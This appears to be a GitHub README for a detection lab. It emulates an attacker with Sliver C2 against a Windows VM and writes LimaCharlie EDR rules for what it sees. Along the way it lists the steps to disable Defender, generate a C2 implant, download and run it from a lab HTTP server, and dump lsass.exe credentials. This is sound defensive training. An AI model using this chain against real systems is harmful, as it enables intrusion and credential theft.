# LimaCharlie & Sliver C2: Adversary Emulation Lab

## Objective
This repository documents the adversary emulation lab using Sliver C2 for command-and-control attack simulation and LimaCharlie for endpoint detection and response. The goal is to simulate real-world attack scenarios, analyze telemetry data, and refine. 


The Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies.

üîπ Security Operations & Defensive Strategies
- Refining security detection logic for advanced threat detection.
- Investigating system behavior post-compromise for forensic insights.
- Applying MITRE ATT&CK mappings to real-world adversary techniques.




### Tools Used
üîπ Virtual Machines (VMs)
- Windows 10 (Target Machine) ‚Äì Acts as the endpoint where Sliver C2 payloads are executed. LimaCharlie sensor is deployed here to capture telemetry.
- Kali Linux (Attacker Machine) ‚Äì Used for launching Sliver C2, executing commands, and emulating adversary techniques.
- Ubuntu Server (Malware Storage) ‚Äì Serves as the host for the malicious Sliver payloads, allowing downloads via an HTTP server for delivery to the Windows target.

üîπ LimaCharlie (EDR Platform)
A cloud-native endpoint detection & response (EDR) tool used to capture and analyze system telemetry. It provides:
- Real-time endpoint monitoring and security event logging.
- Detection & Response (D&R) rules for identifying adversary behaviors.
- Sysmon integration for enhanced process visibility.

üîπ Sliver C2 (Command & Control Framework)
An open-source command-and-control (C2) tool used to simulate real-world adversary techniques. Provides:
- Payload generation for remote access and execution.
- Session management to interact with compromised endpoints.
- Defensive tool awareness by highlighting detected security features.



## Steps

First thing we got to do is to remove security defense in Windows VM.

![image](https://github.com/user-attachments/assets/fdee6963-0944-43e2-9838-a5c1abe6feff)


Some instances, the security settings will automatically turn on again, so we will ‚Äòdouble disable‚Äô it in gpedit.msc
(Computer configuration > Administrative Template > Windows Components > Microsoft Defender Antivirus)

Add demo configuration : Extended Detection & Response Standard.

Add sensor. Follow the instruction in LimaCharlie Docs in telemetry sensor deployment
(https://docs.limacharlie.io/v1/docs/telemetry-sensor-deployment)

Configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry;

Setting up the attack: 
In Kali Linux, connect in Ubuntu server using SSH (ssh ‚Äòuser‚Äô@‚Äôubuntu-server-IP‚Äô)

Then download the Sliver : wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -0 /usr/local/bin/sliver-server

Then make it executable : chmod +x /usr/local/bin/sliver-server

Also install mingw-w64 for additional capabilities : apt install -y mingw-w64
Launch sliver (sliver-server)
![image](https://github.com/user-attachments/assets/1847ef67-7a85-4b6b-8073-e66ff4839fd7)

Generate C2 payload : generate ‚Äìhttp [Ubuntu server IP] ‚Äìsave /opt/sliver
![image](https://github.com/user-attachments/assets/86f3b718-f5e8-4d4d-8ede-64abeac8d593)

Setup a temporary server in Ubuntu server so the payload can be download by or target pc :
python3 -m http.server 80
Then switch to our Windows VM then launch administrative powershell :
IWR -Uri http://10.0.2.13/LOW_BAGGAGE.exe -Outfile C:\Users\vboxuser\Downloads\LOW_BAGGAGE.exe
![image](https://github.com/user-attachments/assets/068375e9-8f3b-48d7-bfcb-0b533b70ed6f)

Back to our (SSH)ubuntu server
Quit the python web server then relaunch the sliver-server, start http listener by typing ‚Äòhttp‚Äô
![image](https://github.com/user-attachments/assets/43587b79-32a0-465f-aefc-99639eb26318)

Return to Windows VM then execute the C2 Payload using administrative powershell.

Go to LimaCharlie then check our sensor. Select the windows VM then go to process :

Go to file system of our windows machine in LimaCharlie to get the hash of file then inspect it to Virustotal.

**When you tried to check it to Virustotal. No results will found. 
But it doesn‚Äôt mean its innocent.
It‚Äôs just VirusTotal is never seen it before. This makes sense because we just generated the payload.
The important lesson for any analyst to learn : if you already suspect a file to be possible malware, but VirusTotal has never seen it before, trust your gut. This actually make a file even more suspicious because nearly everything  has been seen by VirusTotal, so the malware may be custom-crafter/targeted which ups the ante a bit.**


Next, lets dump the **lsass.exe** process from memory

![image](https://github.com/user-attachments/assets/a3517011-f22c-4f91-beb3-5775ddfa09ec)


Go back to Timeline then filter for : ‚ÄúSENSITIVE_PROCESS_ACCESS‚Äù
![image](https://github.com/user-attachments/assets/07dc4bf9-05f8-413a-a2c2-779cfd03f577)


Then build a D&R rules from it.

![image](https://github.com/user-attachments/assets/131deeb7-ca76-41e0-878a-fc769cf561e5)

Scroll to the bottom to test our D&R rule.
Paste the SENSITIVE_PROCESS_ACCESS code then click Test Event.
Save the rule.


![image](https://github.com/user-attachments/assets/d214a89a-277d-48d4-ad37-7179554ed140)

Try to dump the lsass.exe again using the same command to check if our rule is really working.
